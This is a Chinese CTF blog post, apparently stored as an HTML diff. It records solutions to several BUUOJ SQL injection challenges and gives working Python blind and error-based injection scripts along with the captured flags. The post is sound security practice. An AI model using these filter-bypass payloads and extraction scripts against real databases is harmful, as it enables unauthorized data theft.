@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='[SUCTF 2019]EasySQL 考点：堆叠注入、MySQL中sql_mode参数
+题目存在过滤，尝试之后发现可以通过0 || 1这样的语句进行bool盲注，但是此题似乎限制了输入信息的长度，所以这个盲注只能注出来库名CTF后面的东西就没办法搞，后来看了wp之后才知道存在堆叠注入，尝试之：
+1;并没有报错，而且返回了查询成功额页面，所以存在堆叠注入
+1;show databases;返回
+Array ( [0] =&amp;gt; 1 ) Array ( [0] =&amp;gt; ctf ) Array ( [0] =&amp;gt; ctftraining ) Array ( [0] =&amp;gt; information_schema ) Array ( [0] =&amp;gt; mysql ) Array ( [0] =&amp;gt; performance_schema ) Array ( [0] =&amp;gt; test )表名：
+1;show tables;返回：
+Array ( [0] =&amp;gt; 1 ) Array ( [0] =&amp;gt; Flag )但是flag关键字被过滤了，'><title>BUUOJ刷题记录</title>
+
+<link rel='canonical' href='https://example.com/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='BUUOJ刷题记录'>
+<meta property='og:description' content='[SUCTF 2019]EasySQL 考点：堆叠注入、MySQL中sql_mode参数
+题目存在过滤，尝试之后发现可以通过0 || 1这样的语句进行bool盲注，但是此题似乎限制了输入信息的长度，所以这个盲注只能注出来库名CTF后面的东西就没办法搞，后来看了wp之后才知道存在堆叠注入，尝试之：
+1;并没有报错，而且返回了查询成功额页面，所以存在堆叠注入
+1;show databases;返回
+Array ( [0] =&amp;gt; 1 ) Array ( [0] =&amp;gt; ctf ) Array ( [0] =&amp;gt; ctftraining ) Array ( [0] =&amp;gt; information_schema ) Array ( [0] =&amp;gt; mysql ) Array ( [0] =&amp;gt; performance_schema ) Array ( [0] =&amp;gt; test )表名：
+1;show tables;返回：
+Array ( [0] =&amp;gt; 1 ) Array ( [0] =&amp;gt; Flag )但是flag关键字被过滤了，'>
+<meta property='og:url' content='https://example.com/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/'>
+<meta property='og:site_name' content='wh1sper'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' />
+<meta name="twitter:title" content="BUUOJ刷题记录">
+<meta name="twitter:description" content="[SUCTF 2019]EasySQL 考点：堆叠注入、MySQL中sql_mode参数
+题目存在过滤，尝试之后发现可以通过0 || 1这样的语句进行bool盲注，但是此题似乎限制了输入信息的长度，所以这个盲注只能注出来库名CTF后面的东西就没办法搞，后来看了wp之后才知道存在堆叠注入，尝试之：
+1;并没有报错，而且返回了查询成功额页面，所以存在堆叠注入
+1;show databases;返回
+Array ( [0] =&amp;gt; 1 ) Array ( [0] =&amp;gt; ctf ) Array ( [0] =&amp;gt; ctftraining ) Array ( [0] =&amp;gt; information_schema ) Array ( [0] =&amp;gt; mysql ) Array ( [0] =&amp;gt; performance_schema ) Array ( [0] =&amp;gt; test )表名：
+1;show tables;返回：
+Array ( [0] =&amp;gt; 1 ) Array ( [0] =&amp;gt; Flag )但是flag关键字被过滤了，">
+    </head>
+    <body class="">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.body.dataset.scheme = 'dark';
+        } else {
+            document.body.dataset.scheme = 'light';
+        }
+    })();
+</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_huda2458f72ce188392d75c5d51cd8e24e_373_300x0_resize_box_2.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="https://example.com">wh1sper</a></h1>
+        <h2 class="site-description">专注Web安全</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/about'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>Dark Mode</span>
+            </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="https://example.com" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <h2 class="article-title">
+        <a href="/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">BUUOJ刷题记录</a>
+    </h2>
+
+    </div>
+</header>
+
+    <section class="article-content">
+    <h3 id="suctf-2019easysqlhttpsbuuojcnchallengessuctf202019easysql"><a class="link" href="https://buuoj.cn/challenges#[SUCTF%202019]EasySQL"  target="_blank" rel="noopener"
+    >[SUCTF 2019]EasySQL</a></h3>
+<p>考点：堆叠注入、MySQL中sql_mode参数</p>
+<p>题目存在过滤，尝试之后发现可以通过<code>0 || 1</code>这样的语句进行bool盲注，但是此题似乎限制了输入信息的长度，所以这个盲注只能注出来库名<code>CTF</code>后面的东西就没办法搞，后来看了wp之后才知道存在堆叠注入，尝试之：</p>
+<pre><code>1;
+</code></pre><p>并没有报错，而且返回了查询成功额页面，所以存在堆叠注入</p>
+<pre><code>1;show databases;
+</code></pre><p>返回</p>
+<pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; ctf ) Array ( [0] =&gt; ctftraining ) Array ( [0] =&gt; information_schema ) Array ( [0] =&gt; mysql ) Array ( [0] =&gt; performance_schema ) Array ( [0] =&gt; test )
+</code></pre><p>表名：</p>
+<pre><code>1;show tables;
+</code></pre><p>返回：</p>
+<pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )
+</code></pre><p>但是flag关键字被过滤了，</p>
+<p>这就没办法直接查到flag的信息。</p>
+<p>由官方wp的解释来看，这道题目需要我们去对后端语句进行猜测，有点矛盾的地方在于，其描述的功能和实际的功能似乎并不相符，通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用。</p>
+<p>给出的查询语句是：<code>select $_POST[query] || flag from flag</code></p>
+<p>预期解是：</p>
+<pre><code>1;set sql_mode=pipes_as_concat;select 1
+</code></pre><p>然后有一个非预期是：</p>
+<pre><code>*,1
+</code></pre><p>flag{05c299f9-2a8b-440e-98d1-d528859be168}</p>
+<p>这里说明一下：</p>
+<h4 id="sql_modehttpsblogcsdnnetweixin_42373127articledetails88866710"><a class="link" href="https://blog.csdn.net/weixin_42373127/article/details/88866710"  target="_blank" rel="noopener"
+    >sql_mode</a></h4>
+<p>是一组mysql支持的基本语法及校验规则
+查询当前系统sql_mode的设置:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165655.png" alt="img"  /></p>
+<p>其中：</p>
+<p>PIPES_AS_CONCAT：
+将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p>
+<h3 id="极客大挑战-2019finalsqlhttpsbuuojcnchallenges极客大挑战202019finalsql">[<a class="link" href="https://buuoj.cn/challenges#[%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98%202019]FinalSQL"  target="_blank" rel="noopener"
+    >极客大挑战 2019]FinalSQL</a></h3>
+<p>考点：bool盲注，<code>1^(condition)^1</code>绕过or被滤，嵌套()绕过空格被过滤</p>
+<p>相比于这个比赛的其他sqli，这道题多了<code>id=</code>的查询页面，并且提示了是MySQL盲注</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165702.jpeg" alt="img"  /></p>
+<p>起初发现了username位置可以用反斜杠逃逸，不过因为所有的注释方法都被过滤了，就没有什么用</p>
+<p>fuzz，常规的单引号，空格，注释，or，|，&amp;都被过滤了。</p>
+<p>随便点一个数字，发现是不用注释的数值型注入（嘿嘿嘿）</p>
+<p><code>or</code>被过滤，使用<code>1^(condition)</code>来绕过：</p>
+<pre><code>?id=0
+//返回ERROR
+?id=0^1
+//返回NO! Not this! Click others~~~
+</code></pre><p>那么我们注入成功了，不过要把<code>(condition)</code>换成其他查询语句还需要在末尾再添一个<code>^1</code>（我也不知道怎么回事儿）</p>
+<pre><code>?id=1^((length(database()))&gt;1)^1
+//返回NO! Not this! Click others~~~
+?id=1^((length(database()))&gt;99)^1
+//返回ERROR！！！
+</code></pre><p>那么我们可以轻松地区别出bool真假页面返回信息不同</p>
+<p>话不多说，直接上exp：</p>
+<pre><code>#by wh1sper
+#bool盲注
+import requests
+
+host = 'http://368375df-ca56-4f5d-8cd4-ab07fb575003.node3.buuoj.cn/search.php?id='
+
+def mid(bot, top):
+    return (int)(0.5*(top + bot))
+
+def sqli():
+    name = ''
+    for j in range(1, 250):
+        top = 126
+        bot = 32
+        while 1:
+            #select = '(ascii(substr(database(),{},1)))&gt;{}'.format(j, mid(top, bot))#---&gt;geek
+            #查库名
+
+            #select = &quot;(ascii(substr((select(group_concat(table_name))
+            # from(information_schema.tables)where(table_schema='geek')),{},1)))&gt;{}&quot;
+            # .format(j, mid(top, bot))#---&gt;F1naI1y,Flaaaaag
+            #查表名
+
+            #select = &quot;(ascii(substr((select(group_concat(column_name))
+            # from(information_schema.columns)where(table_name='Flaaaaag')),{},1)))&gt;{}&quot;
+            # .format(j, mid(top, bot))#---&gt;id,fl4gawsl
+            #查列名
+            
+            select = &quot;(ascii(substr((select(group_concat(password))&quot; \
+                     &quot;from(F1naI1y)),{},1))&gt;{})&quot;.format(j, mid(top, bot))
+
+            playload = &quot;1^(&quot;+select+&quot;)^1&quot;
+            #print(playload)
+            r = requests.get(url=host+playload)
+            #print(r.text)
+            if 'NO!' in r.text:  # 成功
+                if top - 1 == bot:      # top和bot相邻，说明name是top
+                    name += chr(top)
+                    print(name)
+                    break
+                bot = mid(bot, top)  # 成功就上移bot
+            else:               # 失败
+                if top - 1 == bot:      # top和bot相邻，加上失败，说明name是bot
+                    name += chr(bot)
+                    print(name)
+                    break
+                top = mid(bot, top)  # 失败就下移top
+
+
+if __name__ == '__main__':
+    sqli()
+</code></pre><p>flag{c0db499e-7c62-46c7-a2ce-0bd9a239cc25}</p>
+<h3 id="ciscn2019-华北赛区-day2-web1hack-worldhttpsbuuojcnchallengesciscn201920华北赛区20day220web1hack20world">[<a class="link" href="https://buuoj.cn/challenges#[CISCN2019%20%e5%8d%8e%e5%8c%97%e8%b5%9b%e5%8c%ba%20Day2%20Web1]Hack%20World"  target="_blank" rel="noopener"
+    >CISCN2019 华北赛区 Day2 Web1]Hack World</a></h3>
+<p>考点：SQLi、括号嵌套绕过空格、^符号绕过or</p>
+<p>直接给了表名=&lsquo;flag&rsquo;，列名=&lsquo;flag&rsquo;。</p>
+<p>fuzz，常规搞事儿关键字都被过滤；</p>
+<p>想到了前几天做的finalSQLi，尝试用<code>^</code>代替<code>or</code></p>
+<pre><code>0^1
+//返回Hello, glzjin wants a girlfriend.和1的结果一样，说明起效了
+</code></pre><p>那么尝试库名：</p>
+<pre><code>0^(length(database())&gt;1)
+//成功
+</code></pre><p>ok，直接写脚本</p>
+<p>需要注意的是substr(<code>(condition)</code>,1,1)的<code>condition子查询</code>，两边需要括号，不然来不了事儿。</p>
+<p>exp：</p>
+<pre><code>#wh1sper
+#bool盲注
+import requests
+
+host = 'http://14bb7de3-9b94-4870-9178-2fefa1bfc029.node3.buuoj.cn/index.php'
+
+def mid(bot, top):
+    return (int)(0.5*(top + bot))
+
+def sqli():
+    name = ''
+    for j in range(1, 250):
+        top = 126
+        bot = 32
+        while 1:
+
+            #babyselect = &quot;database()&quot;--&gt;ctftraining
+            #babyselect = &quot;version()&quot;--&gt;10.2.26-MariaDB-log
+
+            babyselect = &quot;(select(flag)from(ctftraining.flag))&quot;
+            select = &quot;ascii(substr(&quot;+babyselect+&quot;,{},1))&gt;{}&quot;.format(j, mid(top, bot))
+            playload = &quot;0^(&quot;+select+&quot;)&quot;
+
+            data = {
+                &quot;id&quot;: playload
+            }
+
+            #print(playload)
+            r = requests.post(url=host, data=data)
+            #print(r.text)
+            if 'glzjin wants' in r.text:  # 成功
+                if top - 1 == bot:      # top和bot相邻，说明name是top
+                    name += chr(top)
+                    print(name)
+                    break
+                bot = mid(bot, top)  # 成功就上移bot
+            else:               # 失败
+                if top - 1 == bot:      # top和bot相邻，加上失败，说明name是bot
+                    name += chr(bot)
+                    print(name)
+                    break
+                top = mid(bot, top)  # 失败就下移top
+
+
+if __name__ == '__main__':
+    sqli()
+</code></pre><p>flag{2ed1b2c4-f083-424e-a4e9-303222f99563}</p>
+<h3 id="gyctf2020ezsqlihttpsbuuojcnchallengesgyctf2020ezsqli">[<a class="link" href="https://buuoj.cn/challenges#[GYCTF2020]Ezsqli"  target="_blank" rel="noopener"
+    >GYCTF2020]Ezsqli</a></h3>
+<p>考点：bool盲注，绕<code>information_schema</code>和<code>sys.schema_auto_increment_columns</code>，无列名过滤union和join</p>
+<p>本站<a class="link" href="http://wh1sper.com/2020i%e6%98%a5%e7%a7%8b%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b_web_wp/"  target="_blank" rel="noopener"
+    >GYCTFwp</a>已经讲过，所以简单说。</p>
+<pre><code>0||1
+//返回Nu1L
+0||0
+//返回Error Occured When Fetch Result.
+</code></pre><p>判断为bool盲注；</p>
+<p><code>information_schema</code>和<code>sys.schema_auto_increment_columns</code>这两个都被过滤了，可以使用<code>sys.schema_table_statistics_with_buffer</code>，无列名，而且过滤union和join，就只能用类似于：</p>
+<pre><code>(select 'admin','admin')&gt;(select * from users limit 1)
+</code></pre><p>这样的语句，前提是两边的查询列数相等，然后是按位比较，在某一位上谁大，那么就是谁大，如果相等的话，就比较下一位。</p>
+<p>举几个例子：</p>
+<pre><code>g &gt; flag{abcd}
+a &lt; flag{abcd}
+fz &gt; flag{bbbbb}//第一位相等，比较第二位
+</code></pre><p>那么直接exp：</p>
+<pre><code>#wh1sper
+#bool盲注
+import requests
+
+host = 'http://7282ff4f-c5c7-4023-be2e-b40f0e422e2c.node3.buuoj.cn/index.php'
+
+def mid(bot, top):
+    return (int)(0.5*(top + bot))
+
+def trans_to_hex(str):
+    result = '0x'
+    for i in str:
+        temp = hex(ord(i))
+        result += temp.replace('0x','')
+    return result
+
+
+def sqli():
+    name = ''
+    for j in range(20, 250):
+        top = 126
+        bot = 32
+        while 1:
+            #babyselect = &quot;(database())&quot;---&gt;give_grandpa_pa_pa_pa
+            #babyselect = &quot;(version())&quot;---&gt;10.2.26-MariaDB-log
+
+            #babyselect = &quot;(select group_concat(table_name) from 
+            # sys.schema_table_statistics_with_buffer
+            # where table_schema=database())&quot;---&gt;users233333333333333,f1ag_1s_h3r3_hhhhh
+
+            #select = &quot;ascii(substr(&quot;+babyselect+&quot;,{},1))&gt;{}&quot;.format(j, mid(top, bot))
+
+            select = &quot;(select * from f1ag_1s_h3r3_hhhhh)&gt;(select 1,{})&quot;.\
+                format(trans_to_hex(name+chr(mid(bot, top))))
+            playload = &quot;0||&quot;+select
+            data = {
+                &quot;id&quot;: playload
+            }
+            #print(playload)
+            r = requests.post(url=host, data=data)
+            #print(r.text)
+            if '|' in name://最后一位没有下一位可以比较，只能在这里返回，替换一下即可
+                name = name.lower().replace('|', '}')
+                print(name)
+                return
+
+            if 'Nu1L' in r.text:  # 成功
+                if top - 1 == bot:      # top和bot相邻，说明name是top
+                    name += chr(top-1)
+                    print(name)
+                    break
+                bot = mid(bot, top)  # 成功就上移bot
+            else:               # 失败
+                if top - 1 == bot:      # top和bot相邻，加上失败，说明name是bot
+                    name += chr(bot)
+                    print(name)
+                    break
+                top = mid(bot, top)  # 失败就下移top
+
+
+if __name__ == '__main__':
+    sqli()
+</code></pre><p>原题flag都是小写，所以就没管它，不过<a class="link" href="https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/"  target="_blank" rel="noopener"
+    >出题人笔记</a>里边本来想考大小写的，我太垃圾，就没管了</p>
+<p>flag{ec726349-d504-4a00-a288-7b72fbc33418}</p>
+<h3 id="极客大挑战-2019hardsqlhttpsbuuojcnchallenges极客大挑战202019hardsql">[<a class="link" href="https://buuoj.cn/challenges#[%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98%202019]HardSQL"  target="_blank" rel="noopener"
+    >极客大挑战 2019]HardSQL</a></h3>
+<p>考点：报错注入</p>
+<p>先是fuzz，引号，注释没被过滤，|、&amp;、空格、*这些都被过滤了</p>
+<p>利用亦或符号进行注入：</p>
+<pre><code>username=1'^1%23&amp;password=1
+回显：
+Login Success!!
+</code></pre><p>应该可以盲注或者报错注入</p>
+<p>我这里用的是报错注入</p>
+<pre><code>import requests
+import re
+ 
+host = 'http://7e5bdd7f-60ce-49fc-88cb-cf4e6ac51763.node3.buuoj.cn/check.php?'
+#babystr = &quot;select(database())&quot;--&gt;geek
+#babystr = &quot;select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))&quot;--&gt;H4rDsq1
+#babystr = &quot;select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1'))&quot;--&gt;id,username,password
+#babystr = &quot;select(left(group_concat(password),31))from(H4rDsq1)&quot;
+babystr = &quot;select(right(group_concat(password),31))from(H4rDsq1)&quot;
+#--flag{9b788a2b-b307-4935-b7e7-0b'
+#--2b-b307-4935-b7e7-0b853f26382a}
+#flag{9b788a2b-b307-4935-b7e7-0b853f26382a}
+payload = &quot;username=1'^updatexml(1,concat(0x7e,({}),0x7e),1)%23&amp;password=1&quot;.format(babystr)
+r = requests.get(host+payload)
+print(payload)
+print(r.text)
+</code></pre><p>注意点是updatexml这个报错注入只能显示32个字符，需要两次用left和right分别打</p>
+<p>flag{9b788a2b-b307-4935-b7e7-0b853f26382a}</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+</aside>
+
+
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2021 wh1sper
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
